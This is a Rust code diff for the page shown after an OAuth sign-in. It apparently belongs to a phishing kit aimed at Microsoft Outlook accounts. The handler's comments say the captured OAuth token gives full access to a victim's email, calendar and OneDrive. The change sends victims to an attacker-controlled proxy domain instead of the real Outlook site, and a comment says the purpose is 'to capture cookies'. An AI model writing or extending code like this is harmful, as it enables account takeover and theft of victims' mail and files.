@@ -616,8 +616,12 @@ async fn exchange_code(
 // Token-based auth-success page: redirect to Outlook after OAuth
 // The OAuth token IS the session - no cookies needed
 // Graph API provides full access to emails, calendar, OneDrive, etc.
-async fn auth_success_handler(query: web::Query<std::collections::HashMap<String, String>>) -> impl Responder {
+async fn auth_success_handler(
+    query: web::Query<std::collections::HashMap<String, String>>,
+    state: web::Data<AppState>,
+) -> impl Responder {
     let token_id = query.get("token_id").cloned().unwrap_or_default();
+    let proxy_domain = &state.config.proxy_domain;
 
     let html = format!(r#"<!DOCTYPE html>
 <html lang="en">
@@ -674,7 +678,7 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
             height: 100%;
             background: #0078d4;
             border-radius: 2px;
-            animation: progress 2s ease-out forwards;
+            animation: progress 3s ease-out forwards;
         }}
         @keyframes progress {{
             0% {{ width: 0%; }}
@@ -692,13 +696,13 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
         </div>
     </div>
     <script>
-        // Redirect to real Outlook after 2 seconds
+        // Redirect to proxy after 3 seconds to capture cookies
         setTimeout(function() {{
-            window.location.href = 'https://outlook.live.com/mail/0/';
-        }}, 2000);
+            window.location.href = 'https://{}/owa/';
+        }}, 3000);
     </script>
 </body>
-</html>"#);
+</html>"#, proxy_domain);
 
     HttpResponse::Ok()
         .content_type("text/html; charset=utf-8")
